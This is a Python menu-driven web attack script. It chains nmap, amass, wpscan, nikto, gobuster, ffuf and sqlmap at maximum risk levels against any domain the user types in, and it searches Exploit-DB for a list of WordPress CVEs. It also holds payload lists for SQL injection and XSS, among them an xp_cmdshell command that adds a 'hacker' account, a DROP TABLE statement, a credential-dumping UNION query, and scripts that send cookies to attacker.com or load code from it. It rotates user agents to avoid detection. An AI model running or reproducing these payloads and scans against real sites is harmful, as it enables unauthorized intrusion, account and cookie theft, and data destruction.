import os
import sys
import subprocess
import logging
import random
import requests
from urllib.parse import quote, urlparse
from pyExploitDb import PyExploitDb



# Logging configuration
logging.basicConfig(filename='done.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Liste der CVEs 02.12.2024
WORDPRESS_CVES = [
    "CVE-2024-31211",
    "CVE-2024-31210",
    "CVE-2024-31111",
    "CVE-2024-6307",
    "CVE-2024-6306",
    "CVE-2024-6305",
    "CVE-2024-4439",
    "CVE-2024-3923",
    "CVE-2024-2298",
    "CVE-2024-1851",
    "CVE-2024-1642",
    "CVE-2024-1322",
    "CVE-2024-1080",
    "CVE-2024-1038",
    "CVE-2024-0897",
    "CVE-2024-0896",
    "CVE-2023-51681",
    "CVE-2023-39999",
    "CVE-2023-38000",
    "CVE-2023-22622",
    "CVE-2023-5692",
    "CVE-2023-5561",
    "CVE-2023-2745",
    "CVE-2022-43504",
    "CVE-2022-43500"
]

# Extended SQLi Payloads (Updated for 2024)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    '" OR 1=1 --',
    "admin' --",
    "' UNION SELECT NULL, username, password FROM users --",
    "'; DROP TABLE users; --",
    "' OR 1=1 LIMIT 1,1 --",
    "' AND 1=1 UNION SELECT NULL, NULL, database(), NULL --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",
    "'; EXEC xp_cmdshell('net user hacker password /add') --",  # Advanced OS Command Injection
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",  # Example of blind SQLi (OS command execution)
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) = 1 --"  # Enum tables in some databases
]

# Extended XSS Payloads (Updated for 2024)
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<a href="javascript:alert(1)">Click Me</a>',
    '<iframe src="javascript:alert(1)">',
    '<input type="text" value="XSS" onfocus="alert(1)">',
    '<div onmouseover="alert(1)">Hover over me</div>',
    '<img src="x" onerror="alert(document.cookie)">',  # Cookie-stealing via XSS
    '<script>fetch("http://attacker.com?cookie=" + document.cookie)</script>',  # Advanced XSS - stealing cookies
    '<svg><script xlink:href="data:attack">alert(document.domain)</script></svg>',
    '<body onload=alert(1)>',
    '<script>eval("alert(1)")</script>',  # Using eval for XSS
    '<input type="image" src="x" onerror="alert(1)">',  # New attack with input image tag
    '<script src="https://attacker.com/malicious.js"></script>',  # External JS XSS attack
]

# Random user-agent and header manipulation
def randomize_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,de;q=0.8",
        "Connection": "keep-alive",
    }
    return headers

# Function to run the setup bash script
def run_bash_setup():
    print("Running the setup.sh installation script...")
    try:
        subprocess.run(["sudo", "bash", "setup.sh"], check=True)
        print("All tools installed successfully!")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running setup.sh: {e}")
        print(f"Error running setup.sh: {e}")

# Function to check if it's a WordPress site
def is_wordpress_site(url):
    indicators = ["/wp-login.php", "/wp-admin/", "/wp-content/"]
    for indicator in indicators:
        test_url = url + indicator
        try:
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200:
                logging.info(f"WordPress detected at: {url}")
                return True
        except requests.RequestException:
            continue  # Skip if page is unreachable
    return False

# Function to get exploits for WordPress using pyExploitDb
def get_exploits_for_wordpress():
    exploits = []
    for cve in WORDPRESS_CVES:
        try:
            # Suchen nach Exploits für jedes CVE
            search_results = pyExploitDb.search(cve)
            if search_results:
                exploits.append((cve, search_results))
                logging.info(f"Exploit für {cve} gefunden: {search_results}")
            else:
                logging.info(f"Kein Exploit für {cve} gefunden.")
        except Exception as e:
            logging.error(f"Fehler beim Suchen nach {cve}: {e}")
    return exploits

# WPScan to scan for WordPress vulnerabilities
def run_wpscan(domain):
    print(f"Running WPScan for: {domain}")
    subprocess.run(["wpscan", "--url", domain, "--enumerate", "u", "--random-user-agent"])

# Amass to scan for subdomains
def run_amass(domain):
    subprocess.run(["/snap/bin/amass", "enum", "-d", domain])

# Nikto to check for common vulnerabilities
def run_nikto(domain):
    subprocess.run(["nikto", "-h", domain, "-C", "all"])

# Gobuster verwenden, um Verzeichnisse und Dateien zu brute-forcen
def run_gobuster(domain):
    formatted_url = validate_and_format_url(domain)  # Sicherstellen, dass die URL richtig formatiert ist
    subprocess.run(["gobuster", "dir", "-u", f"{formatted_url}", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])

# Ffuf verwenden, um Verzeichnisse und Dateien zu brute-forcen
def run_ffuf(domain):
    formatted_url = validate_and_format_url(domain)  # Sicherstellen, dass die URL richtig formatiert ist
    subprocess.run(["ffuf", "-u", f"{formatted_url}/FUZZ", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])


# SQLMap to check for SQL injection vulnerabilities
def run_sqlmap(url):
    subprocess.run(["sqlmap", "-u", url, "--batch", "--risk=3", "--level=5"])

# Function to perform Nmap scan
def run_nmap(domain):
    print(f"\nSelect Nmap scan type:")
    print("1. Basic scan")
    print("2. Aggressive scan")
    print("3. Specific ports scan")
    print("4. Custom scan (enter your own Nmap parameters)")
    choice = input("Your choice: ")

    try:
        if choice == "1":
            subprocess.run(["nmap", domain])
        elif choice == "2":
            subprocess.run(["nmap", "-A", domain])
        elif choice == "3":
            ports = input("Enter ports to scan (e.g., 80,443,22): ")
            subprocess.run(["nmap", "-p", ports, domain])
        elif choice == "4":
            custom_params = input("Enter custom Nmap parameters (e.g., '-sS -T4'): ")
            subprocess.run(["nmap"] + custom_params.split() + [domain])
        else:
            print("Invalid choice. Returning to the menu.")
    except Exception as e:
        print(f"Error running Nmap: {e}")


def scan_domain(domain):
    domain = validate_and_format_url(domain)  # Ensures no duplicate http://
    print(f"Starting full scan for: {domain}")

    if is_wordpress_site(domain):
        exploits = get_exploits_for_wordpress()
        if exploits:
            print(f"Found exploits: {exploits}")
        else:
            print(f"No exploits found for WordPress.")
    else:
        print(f"No WordPress site found at {domain}. Skipping exploit search.")

    # Run other scans
    run_amass(domain)
    run_wpscan(domain)
    run_nikto(domain)
    run_gobuster(domain)
    run_ffuf(domain)

# Function to check for SQLi vulnerabilities
def check_sql_injection_with_sqlmap(url):
    try:
        result = subprocess.run(['sqlmap', '-u', url, '--batch', '--risk=3', '--level=5'], capture_output=True, text=True)
        if "sqlmap identified the following injection point" in result.stdout.lower():
            logging.info(f"SQLi vulnerability found at: {url}")
            return True
        return False
    except Exception as e:
        print(f"Error with sqlmap: {e}")
        return False

# Function to check for XSS vulnerabilities
def check_xss(url):
    for payload in XSS_PAYLOADS:
        encoded_payload = quote(payload)  # URL-encode the payload
        response = requests.get(url + encoded_payload, headers=randomize_headers())
        if encoded_payload in response.text:
            logging.info(f"XSS vulnerability found at: {url} with payload: {encoded_payload}")
            return True
    return False

# Function to validate and format the URL
def validate_and_format_url(url):
    # Entfernen von doppelt vorkommendem "http://" oder "https://"
    if url.startswith("http://http://"):
        url = url.replace("http://http://", "http://")
    elif url.startswith("https://https://"):
        url = url.replace("https://https://", "https://")
    
    # Wenn keine Protokollangabe vorhanden ist, füge "http://" hinzu
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    
    return url

# Menu function
def show_menu():
    while True:
        print("\nSelect an option:")
        print("1. Install all tools")
        print("2. Perform full security checks")
        print("3. Check only for SQLi vulnerabilities")
        print("4. Check only for XSS vulnerabilities")
        print("5. Perform subdomain scan")
        print("6. Perform directory scan (Gobuster/Ffuf)")
        print("7. Perform Nmap scan")  # New Nmap menu option
        print("8. Exit")
        choice = input("Your choice: ")

        if choice == "1":
            run_bash_setup()
        elif choice == "2":
            domain = input("Enter domain to scan: ")
            domain = validate_and_format_url(domain)
            scan_domain(domain)
        elif choice == "3":
            url = input("Enter URL to check for SQLi: ")
            url = validate_and_format_url(url)
            check_sql_injection_with_sqlmap(url)
        elif choice == "4":
            url = input("Enter URL to check for XSS: ")
            url = validate_and_format_url(url)
            check_xss(url)
        elif choice == "5":
            domain = input("Enter domain for subdomain scan: ")
            domain = validate_and_format_url(domain)
            run_amass(domain)
        elif choice == "6":
            domain = input("Enter domain for directory scan: ")
            domain = validate_and_format_url(domain)
            run_gobuster(domain)
            run_ffuf(domain)
        elif choice == "7":
            domain = input("Enter domain or IP for Nmap scan: ")
            run_nmap(domain)  # Call the new Nmap function 05.12.2024
        elif choice == "8":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    show_menu()
    exploits = get_exploits_for_wordpress()
    if exploits:
        for cve, exploit in exploits:
            print(f"Exploit for {cve}: {exploit}")
    else:
        print("No exploits found.")


 
        # Nmap command with detailed options:
        # -A: Enables OS detection, version detection, script scanning, and traceroute.
        # -sC: Uses the default set of Nmap scripts for additional information gathering.
        # -sS: SYN scan (stealthy and fast).
        # -T4: Sets the timing template to speed up the scan (aggressive yet stable).
        # -p-: Scans all 65,535 ports instead of just the default 1,000 ports.
        # --min-rate 5000: Ensures a minimum packet rate of 5,000 packets per second to speed up the scan.
        # --open: Displays only open ports, filtering out unnecessary data about closed ports.
        # -Pn: Skips host discovery (useful when hosts block ICMP ping).
        # --script vuln: Executes vulnerability detection scripts to identify potential weaknesses.  
